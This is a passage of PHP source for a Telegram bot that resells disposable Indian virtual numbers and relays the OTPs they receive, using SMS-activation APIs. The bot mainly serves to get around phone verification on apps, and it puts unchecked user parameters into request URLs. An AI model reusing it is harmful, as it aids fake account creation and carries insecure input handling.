   sendAlert("⚠️ Request Timed Out",$cid);
    return;}


    $user = main($chat_id);
   /* $data2 = json_decode(file_get_contents("admin/info.json"), true);
$plan = trim(strval(main($chat_id)['plan']));
$per = array_filter($data2['membership'], function ($item) use ($plan) {
    $itemName = trim($item['Name']); 
    return strtolower($itemName) === strtolower($plan); 
    });
    $discount = array_column($per, 'discount');
$r2 = (intval($param) * intval($discount[0]))/100;
$rate = (main($chat_id)['plan'] != 'free')?$param-$r2:$param;*/
$rate = $param;
    if($user['balance'] < $rate){
    sendAlert("😭 Sorry you don't have enough balance to buy this service. Please recharge your account.",$cid);
    return;}
  if(!isset($user['damo'])){
  $user['damo'] = $user['balance'];
  }else{
    $spend = isset($user['spend'])?$user['spend']:0;
    $act = floatval($user['balance']) + floatval($spend);
    if($user['damo'] != $act){
    /*$user['status'] = "ban";
   */ 
  $msg = $user['damo'] > $act?-(floatval($user['damo'])-$act):($act - floatval($user['damo']));
  $otp = 0;
                foreach (main($chat_id)['otp'] as $item) {
    if ((strval($item['type']) === strval("number_issued"))||(strval($item['type']) === strval("otp_taken"))) {
        
        $otp++;
        
            }
}
    sendMessage("*🚨 New Scam By *[User](tg://user?id=$chat_id)*

🧒 User Id : *`$chat_id`*
💰 Balance : ".$user['balance']."
💎 Total Spends : $spend
➕ Total Deposit : ".$user["damo"]."
☎️ Total OTP Buyed : ".$otp."

🚨 Reason : User Have Extra Balance of ".$msg." Rs*","@$schannel",null,"markdown");

    /*sendMessage("🚨 Your balance is ",$chat_id,null,null);*/
     $user['balance'] = floatval($user['balance']) - $msg;
    file_put_contents("data/$chat_id.json",json_encode($user));
    }}
    $url = "https://$sd/v1/user/buy/activation/india/virtual$params/$parameter";
$headers = array(
    "Authorization: Bearer $sapi",
    "Accept: application/json"
);

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($curl);
curl_close($curl);
if(!$response){
sendAlert("An unexpected error occurred
Try again",$cid);
return;}
$data = json_decode($response,true);
   if(!$parameter){
   sendAlert("⚠️ Choose a Listed Service",$cid);
   return;}
   if(($response == '<a href="/404.html">Found</a>.')||($data['phone'] == null)){
   sendAlert("⚠️ No Numbers Found
Try Again After Sometime",$cid);
return;
}
$num = $data['phone'];
    $user['otp'][] = array('id'=>$data['id'],'type'=>'number_issued','price'=>$rate,'number'=>$num);
$user['balance'] = $user['balance'] - $rate;
$spend = isset($user["spend"])?$user["spend"]:0;
$user['spend'] = floatval($spend)+floatval($rate);
file_put_contents("data/$chat_id.json",json_encode($user));
$number = (string) $num;
$numm = substr($number, 3);
    sendMessage("<b>🥳 Success</b>

✅ <b>Your Number</b> : +91 <code>".(int)$numm."</code>

⚠🎀𝐚𝐟𝐭𝐞𝐫 sᴇɴᴅɪɴɢ 𝑜𝑡𝑝 𝚌𝚕𝚒𝚌𝚔 𝚐𝚎𝚝 ᴏᴛᴘ✨ <b>Get OTP</b>

<i>🎀🄽🄾🅃🄴: ɪғ ʏᴏᴜ ᴀʀᴇ ᴜɴᴀʙʟᴇ ᴛᴏ ɢᴇᴛ ᴏᴛᴘ ᴛʜᴇɴ ᴄᴀɴᴄᴇʟ ᴛʜᴇ ɴᴜᴍʙᴇʀ⚠r</i>",$chat_id,array('inline_keyboard'=>[[['text'=>"Get OTP",'callback_data'=>"/get ".$data['id']." ".$rate." ".(int)$numm." ".$parameter],['text'=>"Cancel Number", 'callback_data'=>"/cancel ".$data['id']." ".$rate." ".(int)$numm]]]),"html");
  
  
  
    break;
    case '/get':
    $user = main($chat_id);
    foreach ($user['otp'] as $item) {
    //sendMessage($item['id'],$chat_id,null,null);
    if (intval($item['id']) === intval($parameter)) {
        
        $ite = strval($item['type']);
        break; 
            }
}
if($ite == strval('cancel_otp')){
sendAlert("⚠️ This Number is Cancelled",$cid);
   return;
    }
if($ite == strval('otp_taken')){
return;
}
            $url = "https://$sd/v1/user/check/$parameter";
$headers = array(
    "Authorization: Bearer $sapi",
    "Accept: application/json"
);

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($curl);
curl_close($curl);
$data = json_decode($response,true);
    
    
    if ($data['status'] == "CANCELED") {
        sendAlert("⚠️ This Number is Cancelled",$cid);
   return;
    }
    if(count($data['sms']) == 0){
    sendAlert("❌ No OTP Received ❌
⚠️ First send The OTP or wait for some minutes then run command again",$cid);
return;
}
    if(isset($data['sms'][0]['code'])){
    sendMessage("*Your Requested OTP is* 
Otp : `".$data['sms'][0]['code']."`
*Your Number : +91* `$params`

_⚠️ Kindly Use it Before it Expire_",$chat_id,['inline_keyboard'=>[[['text'=>'📞 Next Otp','callback_data'=>"/next $parameter"]]]],"markdown");
    }
    $apiUrl = "https://api.telegram.org/bot$token/deleteMessage?chat_id=$chat_id&message_id=$message_id";
    file_get_contents($apiUrl);
    $deposit = main($chat_id)['damo'] == null?0:main($chat_id)['damo'];
    sendMessage ("*🔔 New OTP Request 🔔

🧒 User :* [".$bot['callback_query']['from']['first_name']."](tg://user?id=".$chat_id.") 
*🔎 Telegram Id :* `$chat_id`
*🔥 Service : $parm
🛒 Service Id : $parameter
🏦 Price : $param
💰 Balance : *".main($chat_id)['balance']."
*💶 Deposit : $deposit*","@$pchannel",null,"markdown");
    $user = main($chat_id);
    foreach ($user['otp'] as &$item) {
    if (intval($item['id']) === intval($parameter)) {
        
        $item['type'] = strval('otp_taken');
        break; 
            }
}
file_put_contents("data/$chat_id.json",json_encode($user));
/*if($chat_id == 1834957586){?>

<script>
   
    const sd = <?php $sd ?>; // Replace with your actual sd value
    const sapi = <?php $sapi ?>; // Replace with your actual sapi value
    const token = <?php $token ?>; // Replace with your actual Telegram bot token
    const pchannel = <?php $pchannel ?>; // Replace with your actual pchannel value
    const chat_id = <?php $chat_id ?>; // Replace with your actual chat_id value
    const parameter = <?php $parameter ?>; // Replace with your actual parameter value
    const parm = <?php $parm ?>; // Replace with your actual parm value
    const param = <?php $param ?>; // Replace with your actual param value

    const url = `https://${sd}/v1/user/check/${parameter}`;
    const headers = {
        "Authorization": `Bearer ${sapi}`,
        "Accept": "application/json"
    };

    fetch(url, {
        headers: headers
    })
    .then(response => response.json())
    .then(data => {
        if (data['status'] === "CANCELED") {
            sendMessage("*This Number is Cancelled*", chat_id, null, "markdown");
            return;
        }
        if (data['sms'].length === 0) {
            sendMessage("*No OTP Received. First send The OTP or wait for some minutes then run the command again*", chat_id, null, "markdown");
            return;
        }
        if (data['sms'][0]['code']) {
            sendMessage("*Your Requested OTP is*\nOtp : `" + data['sms'][0]['code'] + "`\n*Your Number : +91* `" + params + "`\n_⚠️ Kindly Use it Before it Expires_", chat_id, { 'inline_keyboard': [[{ 'text': '📞 Next Otp', 'callback_data': "/next " + parameter }]] }, "markdown");
        }
        const apiUrl = `https://api.telegram.org/bot${token}/deleteMessage?chat_id=${chat_id}&message_id=${message_id}`;
        fetch(apiUrl); // Assuming you want to delete the message from Telegram.

        sendMessage("🔔 New OTP Request 🔔\n🧒 User : [" + bot['callback_query']['from']['first_name'] + "](tg://user?id=" + chat_id + ")\n🔥 Service : " + parm + "\n🏦 Price : " + param + "\n💰 Balance : " + main(chat_id)['balance'], "@" + pchannel, null, "markdown");

        const user = main(chat_id);
        for (let item of user['otp']) {
            if (item['id'] === String(parameter)) {
                item['type'] = 'otp_taken';
                break;
            }
        }
        // Assuming you want to save the modified user data.
        // Implement your file saving logic here.
    })
    .catch(error => console.error(error));
</script>


<?php
}*/
break;
case '/next':
$url = "https://$sd/v1/user/check/$parameter";
$headers = array(
    "Authorization: Bearer $sapi",
    "Accept: application/json"
);

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($curl);
curl_close($curl);
$data = json_decode($response,true);
    
    
    if ($data['status'] == "CANCELED") {
        sendAlert("⚠️ This Number is Cancelled",$cid);
   return;
    }
    if(count($data['sms'][1]) == 0){
    //sendMessage($response,$chat_id,null,null);
    sendAlert("❌ No OTP Received ❌
⚠️ First send The OTP or wait for some minutes then run command again",$cid);
return;
}
    if($data['sms'][1]['code']){
    sendMessage("*Your Requested OTP is* 
*☎️ OTP : *`".$data['sms'][1]['code']."`
*📞 Your Number : *`$params`

_⚠️ Kindly Use it Before it Expire_",$chat_id,null,"markdown");
    }
    $apiUrl = "https://api.telegram.org/bot$token/deleteMessage?chat_id=$chat_id&message_id=$message_id";
    file_get_contents($apiUrl);
    
sendMessage ("🔔 Next OTP Request 🔔

🧒 User : [".$bot['callback_query']['from']['first_name']."](tg://user?id=".$chat_id.")
🔥 Id : $parameter","@paymentrecievestatus",null,"markdown");
$user = main($chat_id);
$user['otp'][] = array('id'=>$parameter,'type'=>"next_otp",);
file_put_contents("data/$chat_id.json",json_encode($user));
break;
case '/cancel':
$user = main($chat_id);
    foreach ($user['otp'] as $item) {
    //sendMessage($item['id'],$chat_id,null,null);
    if (intval($item['id']) === intval($parameter)) {
        
        $ite = strval($item['type']);
        break; 
            }
}
if($ite == strval('otp_taken')){
sendAlert("⚠️ You have taken a OTP on this number",$cid);
$apiUrl = "https://api.telegram.org/bot$token/deleteMessage?chat_id=$chat_id&message_id=$message_id";
file_get_contents($apiUrl);
    return;
    }
if($ite == strval('cancel_otp')){
return;
}

$url = "https://$sd/v1/user/check/$parameter";
$headers = array(
    "Authorization: Bearer $sapi",
    "Accept: application/json"
);

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($curl);
curl_close($curl);
$data = json_decode($response,true);
    
    
    
    if(count($data['sms']) != 0){
    sendAlert("⚠️ Your Number have a OTP
🔥 Click on Get OTP",$cid);
return;
}
    if ($data['status'] == "CANCELED") {
        sendAlert("⚠️ This Number is Already Cancelled",$cid);
        $apiUrl = "https://api.telegram.org/bot$token/deleteMessage?chat_id=$chat_id&message_id=$message_id";
file_get_contents($apiUrl);
   return;
    }
    $apiUrl = "https://api.telegram.org/bot$token/deleteMessage?chat_id=$chat_id&message_id=$message_id";
file_get_contents($apiUrl);
    if($data['status'] != "CANCELED"){
    
sendAlert("🔥 Cancelled Number Successfully",$cid);
$url = "https://$sd/v1/user/cancel/$parameter";
$headers = array(
    "Authorization: Bearer $sapi",
    "Accept: application/json"
);

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($curl);
curl_close($curl);
$user = main($chat_id);
    $user['balance'] = $user['balance'] + $param;
    $spend = isset($user["spend"])?$user["spend"]:0;
    $rs = $spend > $param?floatval($spend)-floatval($param):floatval($param)-floatval($spend);
$user['spend'] = $rs;
foreach ($user['otp'] as &$item) {
    if ($item['id'] === intval($parameter)) {
        
        $item['type'] = 'cancel_otp';
        break; 
            }
}

file_put_contents("data/$chat_id.json",json_encode($user));
sleep(30);
}
break;
case '/fser':
$apiUrl = "https://api.telegram.org/bot$token/deleteMessage?chat_id=$chat_id&message_id=$message_id";
file_get_contents($apiUrl);
    $a = file_get_contents("https://fastsms.su/stubs/handler_api.php?api_key=$fapi&action=getServices");
$nameList = json_decode($a, true);
$services = array_unique($nameList);
asort($services);
$count = ($parameter != null)?$parameter:0;
$batchServices = array_slice($services,$count, 50);
$msg = "";
foreach ($batchServices as $value => $name) {
    $msg .= "*➤* `$name` */otp2_$value*\n";
}

$inlineKeyboard = array();
    $inlineKeyboard[] = array(
        array(
            "text" => "Next ⏭",
            "callback_data" => "/fser ".(intval($parameter)+50)
        )
    );
sendMessage($msg, $chat_id, array('inline_keyboard' => $inlineKeyboard), 'markdown');

            break;
    case '/otp2':
    
   if(!isset($parm)){
   $apiUrl = "https://api.telegram.org/bot$token/deleteMessage?chat_id=$chat_id&message_id=$message_id";
    file_get_contents($apiUrl);
   sendAlert("⚠️ An Unknown Error occured",$cid);
    return;}
    date_default_timezone_set('Asia/Kolkata');
$currentDateTimeIST = new DateTime();
$currentDateTimeIST->setTimezone(new DateTimeZone('Asia/Kolkata'));
$currentDateISTV = $currentDateTimeIST->format('d/m/Y');
    $currentTimeISTV = $currentDateTimeIST->format('g:i:s');
      
$currentDateIST = $para;
$currentTimeIST = $parm;

$currentTimeISTDateTime = DateTime::createFromFormat('H:i:s', $currentTimeIST);
$allowedDateTime = clone $currentTimeISTDateTime;
$allowedDateTime->add(new DateInterval('PT10M')); // Increase current time by 20 minutes

$allowedDate = $allowedDateTime->format('d/m/Y');
$allowedTime = $allowedDateTime->format('H:i:s');
$tm = explode(':', $currentTimeISTV);
$tm2 = (floatval($tm[0])*60*60)+(floatval($tm[1])*60)+floatval($tm[2]);
$tmm = explode(':', $allowedTime);
$tmm2 = (floatval($tmm[0])*60*60)+(floatval($tmm[1])*60)+floatval($tmm[2]);

if ($allowedDate != $currentDateISTV || $tm2 > $tmm2) {
$apiUrl = "https://api.telegram.org/bot$token/deleteMessage?chat_id=$chat_id&message_id=$message_id";
    file_get_contents($apiUrl);
   sendAlert("⚠️ Request Timed Out",$cid);
    return;}

    $user = main($chat_id);
   /* $data2 = json_decode(file_get_contents("admin/info.json"), true);
$plan = trim(strval(main($chat_id)['plan']));
$per = array_filter($data2['membership'], function ($item) use ($plan) {
    $itemName = trim($item['Name']); 
    return strtolower($itemName) === strtolower($plan); 
    });
    $discount = array_column($per, 'discount');
$r2 = ($param*$discount[0])/100;
$rate = (main($chat_id)['plan'] != 'free')?$param-$r2:$param;*/
$rate = $param;
if($user['balance'] < $rate){
    sendAlert("😭 Sorry you don't have enough balance to buy this service. Please recharge your account.",$cid);
    return;}
  if(!isset($user['damo'])){
  $user['damo'] = $user['balance'];
  }else{
    $spend = isset($user['spend'])?$user['spend']:0;
    $act = floatval($user['balance']) + floatval($spend);
    if($user['damo'] != $act){
    /*$user['status'] = "ban";
   */ 
  $msg = $user['damo'] > $act?-(floatval($user['damo'])-$act):($act - floatval($user['damo']));
  $otp = 0;
                foreach (main($chat_id)['otp'] as $item) {
    if ((strval($item['type']) === strval("number_issued"))||(strval($item['type']) === strval("otp_taken"))) {
        
        $otp++;
        
            }
}
    sendMessage("*🚨 New Scam By *[User](tg://user?id=$chat_id)*

🧒 User Id : *`$chat_id`*
💰 Balance : ".$user['balance']."
💎 Total Spends : $spend
➕ Total Deposit : ".$user["damo"]."
☎️ Total OTP Buyed : ".$otp."

🚨 Reason : User Have Extra Balance of ".$msg." Rs*","@$schannel",null,"markdown");

    /*sendMessage("🚨 Your balance is ",$chat_id,null,null);*/
    $user['balance'] = floatval($user['balance']) - $msg;
    file_put_contents("data/$chat_id.json",json_encode($user));
    }}
    
    $data = file_get_contents("https://fastsms.su/stubs/handler_api.php?api_key=$fapi&action=getNumber&service=$parameter&country=22");
   if($data == 'BAD_SERVICE'){
   sendAlert("⚠️ Choose a Listed Service",$cid);
   return;}
   if(($data == "NO_NUMBERS")||($data == "NO_BALANCE")){
   sendAlert("⚠️ No Numbers Found
Try Again After Sometime",$cid);
return;
}

if(!$flag){
$num = explode(':', $data);
    $user['otp'][] = array('id'=>$num[1],'type'=>'number_issued','price'=>$rate,'number'=>$num[2]);
$user['balance'] = $user['balance'] - $rate;
$spend = isset($user["spend"])?$user["spend"]:0;
$user['spend'] = floatval($spend)+floatval($rate);
file_put_contents("data/$chat_id.json",json_encode($user));
$number = (string) $num[2];
$numm = substr($number, 2);
    sendMessage("<b>🥳 Success</b>

✅ <b>Your Number : +91</b> <code>".(int)$numm."</code>

⚠️ After Requesting OTP Click <b>Get OTP</b>

<i>⚠️ Note: If You are unable to get OTP Then Cancel the Number</i>",$chat_id,array('inline_keyboard'=>[[['text'=>"Get OTP","callback_data"=>"/get2 ".$num[1]." ".$rate." ".(int)$numm." ".$parameter],['text'=>"Cancel Number", "callback_data"=>"/cancel2 ".$num[1]." ".$rate." ".(int)$numm]]]),"html");
  }
  $flag = true;
  /*if($chat_id == 1834957586){
  
  sendMessage("working",$chat_id,null,null);
//  checkForSMS($num[1]);
  

}*/
      
 /* $name = $parameter;
  $adm = json_decode(file_get_contents("admin/info.json"),true);
$found = false;
foreach ($adm['Popular'] as &$item) {
    if (isset($item[$name])) {
        $item[$name]++;
        $found = true;
        break;
    }
}
if (!$found) {
    $adm['Popular'][] = [$name => 1];
}

file_put_contents("admin/info.json", json_encode($adm));

  */
    break;
    case '/get2':
    $user = main($chat_id);
    foreach ($user['otp'] as $item) {
    //sendMessage($item['id'],$chat_id,null,null);
    if (intval($item['id']) === intval($parameter)) {
        
        $ite = strval($item['type']);
        break; 
            }}
if($ite == strval('cancel_otp')){
sendAlert("This Number is Cancelled",$cid);
   return;
    }
if($ite == strval('otp_taken')){
return;
}
    if($param == 0){
    return;}
            $apiResponse = file_get_contents("https://fastsms.su/stubs/handler_api.php?api_key=$fapi&action=getStatus&id=$parameter");
    
    if ($apiResponse == "STATUS_CANCEL") {
        sendAlert("⚠️ This Number is Cancelled",$cid);
   return;
    }
    if($apiResponse == "STATUS_WAIT_CODE"){
    sendAlert("❌ No OTP Received ❌
⚠️ First send The OTP or wait for some minutes then run command again",$cid);
return;
}
    $otp = explode(':', $apiResponse); 
    if($otp[0] == "STATUS_OK"){
    sendMessage("*Your Requested OTP is* 
*☎️ OTP : *`".$otp[1]."`
*📞 Your Number : +91* `$params`

_⚠️ Kindly Use it Before it Expire_",$chat_id,['inline_keyboard'=>[[['text'=>'📞 Next Otp','callback_data'=>"/next2 $parameter"]]]],"markdown");
    }
    $apiUrl = "https://api.telegram.org/bot$token/deleteMessage?chat_id=$chat_id&message_id=$message_id";
    file_get_contents($apiUrl);
    
      $a = json_decode(file_get_contents("https://fastsms.su/stubs/handler_api.php?api_key=$fapi&action=getServices"),true);
      $deposit = main($chat_id)['damo'] == null?0:main($chat_id)['damo'];
sendMessage ("*🔔 New OTP Request 🔔

🧒 User :* [@".$bot['callback_query']['from']['username']."](tg://user?id=".$chat_id.")
*🔎 Telegram Id : *`$chat_id`
*?? Service : ".$a[$parm]."
🛒 Service Id : $parameter
🪙 Price : $param
💰 Balance :* ".main($chat_id)['balance']."
*💶 Deposit :* $deposit","@$pchannel",null,"markdown");
$user = main($chat_id);
    foreach ($user['otp'] as &$item) {
    if (intval($item['id']) === intval($parameter)) {
        
        $item['type'] = 'otp_taken';
        break; 
            }
}
file_put_contents("data/$chat_id.json",json_encode($user));

break;
case '/next2':
$api = file_get_contents("https://fastsms.su/stubs/handler_api.php?api_key=$fapi&action=setStatus&id=$parameter&status=3");
if($api == "ACCESS_WAITING"){
sendAlert("❌ No OTP Received ❌
⚠️ First send The OTP or wait for some minutes then run command again",$cid);
return;
}
if($api == "TIMED_OUT"){
sendAlert("❌ You Request Time out ❌
⚠️ Note:- Buy a new Number",$cid);
return;
}
sendMessage($api,$chat_id,null,null);
sendMessage ("🔔 Next OTP Request 🔔

🧒 User : @".$bot['callback_query']['from']['username']."
🔥 Id : $parameter","@$pchannel",null,null);
/*$user = main($chat_id);
$user['otp'][] = array('id'=>$parameter,'type'=>"next_otp",);
file_put_contents("data/$chat_id.json",json_encode($user));*/
break;
case '/cancel2':
$user = main($chat_id);
    foreach ($user['otp'] as $item) {
    //sendMessage($item['id'],$chat_id,null,null);
    if (intval($item['id']) === intval($parameter)) {
        
        $ite = strval($item['type']);
        break; 
            }
}
if($ite == strval('otp_taken')){
sendAlert("⚠️ Your Number have a OTP
🔥 Click on Get OTP",$cid);
    return;
    }
if($ite == strval('cancel_otp')){
return;
}

$api = file_get_contents("https://fastsms.su/stubs/handler_api.php?api_key=$fapi&action=getStatus&id=$parameter");

    if ($api == "STATUS_CANCEL") {
        sendAlert("⚠️ This Number is Already Cancelled",$cid);
        $apiUrl = "https://api.telegram.org/bot$token/deleteMessage?chat_id=$chat_id&message_id=$message_id";
file_get_contents($apiUrl);
   return;
    }
    if($api != "STATUS_WAIT_CODE"){
    sendAlert("⚠️ Your Number have a OTP
🔥 Click on Get OTP",$cid);
return;
}
    $apiUrl = "https://api.telegram.org/bot$token/deleteMessage?chat_id=$chat_id&message_id=$message_id";
file_get_contents($apiUrl);
if($api != "STATUS_CANCEL"){
file_get_contents("https://fastsms.su/stubs/handler_api.php?api_key=$fapi&action=setStatus&id=$parameter&status=8");
sendAlert("🔥 Cancelled Number Successfully",$cid);
$user = main($chat_id);
    $user['balance'] = $user['balance'] + $param;
    $spend = isset($user["spend"])?$user["spend"]:0;
    $rs = $spend > $param?floatval($spend)-floatval($param):floatval($param)-floatval($spend);
$user['spend'] = $rs;
foreach ($user['otp'] as &$item) {
    if ($item['id'] === strval($parameter)) {
        
        $item['type'] = 'cancel_otp';
        break; 
            }
}
file_put_contents("data/$chat_id.json",json_encode($user));
sleep(30);
}
break;

case '/fser1':
$a = file_get_contents("https://fastsms.su/stubs/handler_api.php?api_key=$fapi&action=getServices");
$nameList = json_decode($a, true);
$services = array_unique($nameList);
asort($services);
$searchLetter = $parameter;
$searchResults = [];

foreach ($services as $key => $value) {
    if (stripos($value, $searchLetter) !== false) {
        $searchResults[$key] = $value;
     }
}

if (count($searchResults) > 0) {
    $msg = "Here are the Search Results:\n\nPlease select one of the services below 👇\n\n";

    $index = 1;
    foreach ($searchResults as $key => $value) {
        $msg .= "$index. $value ➤ /otp2_$key\n";
        $index++;
    }

    sendMessage($msg, $chat_id, null, null);
} else {
    sendMessage("🛑 Search not found.", $chat_id, null, null);
}
break;
case '/sser1':
$message = strtolower((string)$parameter);
            $data = file_get_contents("https://$sd/v1/guest/prices?country=india&product=$message");
            $amo = json_decode(file_get_contents("admin/info.json"), true);
       $res = json_decode($data,true);
       $price1 = floatval($res['india']["$message"]["virtual4"]["cost"]);
       $revenue1 = ($price1 * floatval($amo['profit'][0]['1']))/100;
       $final1 = $price1 + number_format($revenue1, 2);
       $price2 = floatval($res['india']["$message"]["virtual21"]["cost"]);
       $revenue2 = ($price2 * floatval($amo['profit'][0]['1']))/100;
       $final2 = $price2 + number_format($revenue2, 2);
       $price3 = floatval($res['india']["$message"]["virtual32"]["cost"]);
       $revenue3 = ($price3 * floatval($amo['profit'][0]['1']))/100;
       $final3 = $price3 + number_format($revenue3, 2);
       $price4 = floatval($res['india']["$message"]["virtual35"]["cost"]);
       $revenue4 = ($price4 * floatval($amo['profit'][0]['1']))/100;
       $final4 = $price4 + number_format($revenue4, 2);
            sendMessage("Kindly select One server To Buy OTP",$chat_id,array('inline_keyboard'=>[[['text'=>"Server 1 >> $final1 Points","callback_data"=>"/servers 4 $message"],['text'=>"Server 2 >> $final2 Points","callback_data"=>"/servers 21 $message"]],[['text'=>"Server 3 >> $final3 Points","callback_data"=>"/servers 32 $message"],['text'=>"Server 4 >> $final4 Points","callback_data"=>"/servers 35 $message"]]]),null);
break;
case '/servers':
     $apiUrl = "https://api.telegram.org/bot$token/deleteMessage?chat_id=$chat_id&message_id=$message_id";
file_get_contents($apiUrl);
     $a = file_get_contents("https://$sd/v1/guest/products/india/virtual$parameter");
$nameList = json_decode($a, true);
$services = array_keys($nameList);
asort($services);
$searchLetter = $param;
$searchResults = [];

$msg = "";
foreach ($services as $index => $value) {
    if (stripos($value, $searchLetter) !== false) {
        $searchResults[$value] = $value;
     }
}
if (count($searchResults) > 0) {
    $msg = "Here are the Search Results:\n\nPlease select one of the services below 👇\n\n";
    $index = 1;
    foreach ($searchResults as $key => $value) {
        $msg .= "$index. $value ➤ /otp_".$key."_".$parameter."\n";
        $index++;
    }
    sendMessage($msg,$chat_id,null,null);
} else {
    sendMessage("🛑 Search not found.", $chat_id, null, null);
}
     break;
        case '/buy':
                $apiUrl = "https://api.telegram.org/bot$token/deleteMessage?chat_id=$chat_id&message_id=$message_id";
    file_get_contents($apiUrl);
sendMessage("Kindly select One Server To Buy OTP",$chat_id,array('inline_keyboard'=>[[['text'=>'🔔 Low Price Server ',"callback_data"=>"/fser"],['text'=>'🔔 Best Price Server',"callback_data"=>"/sser"]]]),null);
           break;
       
           case '/sser':
        $apiUrl = "https://api.telegram.org/bot$token/deleteMessage?chat_id=$chat_id&message_id=$message_id";
    file_get_contents($apiUrl);
sendMessage("Kindly select One server To Buy OTP",$chat_id,array('inline_keyboard'=>[[['text'=>'Server 1',"callback_data"=>"/server 4"],['text'=>'Server 2',"callback_data"=>"/server 21"]],[['text'=>'Server 3',"callback_data"=>"/server 32"],['text'=>'Server 4',"callback_data"=>"/server 35"]]]),null);
            break;
            case '/server':
            $apiUrl = "https://api.telegram.org/bot$token/deleteMessage?chat_id=$chat_id&message_id=$message_id";
    file_get_contents($apiUrl);
            $a = file_get_contents("https://$sd/v1/guest/products/india/virtual$parameter");
$nameList = json_decode($a, true);
$services = array_keys($nameList);
asort($services);
$count = ($param != null) ? $param : 0;
$batchServices = array_slice($services, $count, 30);

$msg = "";
if (empty($batchServices)) {
    $msg = "Search not found";
}else{
foreach ($batchServices as $index => $value) {
    $name = $nameList[$value];
    $msg .= "➤ $value /otp_".$value."_".$parameter."\n";
}
}
$inlineKeyboard = array();
    $inlineKeyboard[] = array(
        array(
            "text" => "Next",
            "callback_data" => "/server $parameter ".(intval($count)+30)
        )
    );
sendMessage($msg, $chat_id, array('inline_keyboard' => $inlineKeyboard), null);

            break;
       
            case '/history':
            if($parameter == "otp"){
                $otp = main($chat_id)['otp'];
                if(count($otp) == 0){
                sendMessage ("Sorry! Your Order History is empty. 🥲",$chat_id,null,null);
                return;
                }
    $msg = "<b>🧿 <u>Your Last 20 Otp History</u> :</b>
\n";

      $nt = count($otp);
$startingIndex = max($nt - 29, 1);

foreach ($otp as $index => $otps) {
    if ($index >= $startingIndex - 1) {
        
        $number = $otps['number'];
        $price = $otps['price'];
        $type = $otps['type'];

        $msg .= ($index + 1) . ". <b>Number:</b> <code>$number</code>
<b>Price:</b> <code>$price</code>
<b>Status:</b> <code>$type</code>
___________________________\n";
    }
}
    sendMessage($msg,$chat_id,null,"html");
             }
             if($parameter == "deposit"){
             $deposit = main($chat_id)['deposit'];
                if(count($deposit) == 0){
                sendMessage ("Opps! You Have Not Deposit Any Amount",$chat_id,null,null);
                return;
                }
    $msg = "<b>🧿 <u>Your Last 20 Deposit History</u> :</b>
\n";
$nt = count($deposit);
$startingIndex = max($nt - 29, 1);
      foreach ($deposit as $index => $otps) {
      if ($index >= $startingIndex - 1) {
        $status = $otps['status'];
      $price = ($otps['amount'] != null)?$otps['amount']:"Not described";
      $type = $otps['type'];
      

        $msg .= ($index + 1) . ". <b>Type:</b> <code>$type</code>
    <b>Amount:</b> <code>$price</code>
    <b>Status:</b> <code>$status</code>\n
";
    }}
    sendMessage($msg,$chat_id,null,"html");
             }
            break;
            case '/term':
            sendMessage ("*Dear Users,
     There are some terms & conditions given please read carefully, else if you have any problem we will not able to help you... 

💠 No refund if the mobile number is already registered as we are unable to check it, if you have any way to check it you can check it on your side.

💠 Use Any Other Option at your own risk, STRICTLY no refund for it in any case except receiving any other SMS

💠 Use WhatsApp, Telegram & Rummy application at your own risk, you might resend if incorrect ones comes. It's free of cost. 

💠 No refund for otp get Wrong And To late, You can easily cancel number If otp not getting under 5 mins, No Gurrenty Of 2nd OTP Buy It On Your Risk

💠 Number is live for 20 mins, if otp not get under 1 min so you can ban number under 20 mins for successful refund, If you not ban number under 20 min so refund cannot be applicable

💠 Please wait 1 min after otp send it's compulsory if you don't wait and buy & block Number continuously without any Waiting so you will be ban if system detect. 

⚠️ Note : If you want to buy Virtual Number for Login & Sign up in any application & Website And Other Use Then this is for you, else don't use this.

✅ For More details message here : @$botu*",$chat_id,null,'markdown');
          break;
            case '/joined':
            $url = "https://api.telegram.org/bot$token/getChatMember?chat_id=@$channel&user_id=$chat_id";
$apiUrl = "https://api.telegram.org/bot$token/deleteMessage?chat_id=$chat_id&message_id=$message_id";
file_get_contents($apiUrl);
$response = json_decode(file_get_contents($url), true);
if ($response['ok'] && (($response['result']['status'] == 'member') || ($response['result']['status'] == 'creator'))) {
    sendMessage("*✨𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝒕𝒐 𝒐𝒖𝒓 𝑽𝑰𝑷𝑻𝑶𝑷_𝑩𝑶𝑻.
🎆𝙷𝙴𝚁𝙴 𝚈𝙾𝚄 𝙲𝙰𝙽 𝙱𝚄𝚈 🅾🆃🅿🆂 ɪɴ ᴄʜᴇᴀᴘ ᴘʀɪᴢᴇ🎆*",$chat_id,array('keyboard'=>[["⭐️ Get OTP","💰 Deposit"],['👨‍💻 Profile','📧 Get Gmail','📈 Status'],['👥 Support','⚙ Settings','👫 Refer']],'resize_keyboard'=>true),'markdown');
} else {
sendMessage("_❌ You are not joined! You must join all Channels!_",$chat_id,null,"markdown");
sendMessage("*👨‍💼 𝖧𝖾𝗅𝗅𝗈 *[".$bot['callback_query']['from']['first_name']."](tg://user?id=".$chat_id.") *𝖯𝗅𝖾𝖺𝗌𝖾 𝖩𝗈𝗂𝗇 𝖮𝗎𝗋 𝖢𝗁𝖺𝗇𝗇𝖾𝗅 𝖳𝗈 𝖠𝖼𝖼𝖾𝗌𝗌 𝖳𝗁𝖾 𝖡𝗈𝗍 :

Join Here : @$channel*",$chat_id,array('inline_keyboard'=>[[['text'=>'✅ Joined','callback_data'=>'/joined']]]),'Markdown');
}
break;
case '/deposit':
 $main = main($chat_id);
          /*  $array = json_decode(file_get_contents("admin/info.json"), true);
            $parameterValue = null;
foreach ($array['method'] as $item) {
    foreach ($item as $key => $value) {
        if ($key === $parameter) {
            $parameterValue = $value;
            break 2; 
        }
    }
}


if ($parameterValue === "off") {
